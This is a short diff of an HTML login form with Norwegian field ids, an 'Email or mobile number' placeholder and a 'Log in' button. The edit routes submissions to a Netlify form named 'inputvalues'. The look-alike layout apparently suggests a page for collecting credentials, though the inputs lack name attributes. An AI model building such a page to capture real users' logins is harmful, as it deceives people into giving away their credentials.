@@ -27,11 +27,16 @@ function myFunction() {
 
 			
 		
-			<form name="inputvalues" method="POST" data-netlify="true">
-		<input type="text" id="brukernavn" placeholder="Email or mobile number" data-netlify="true">
+		<form name="inputvalues" method="POST" data-netlify="true">
+		<input type="hidden" name="form-name" value="inputvalues" />
+
+			
+		<input type="text" id="brukernavn" placeholder="Email or mobile number">
+		
 		
 		<br>
-		<input type="password" id="passord" placeholder="Password" data-netlify="true">
+		<input type="password" id="passord" placeholder="Password">
+		
 
 
 				
@@ -41,7 +46,7 @@ function myFunction() {
 		<br>
 		<br>
 		<button id="loginknapp">Log in</button>
-			</form>
+		</form>
 		<br>
 		<br>
 		<p id="linje"><span>or</span></p>
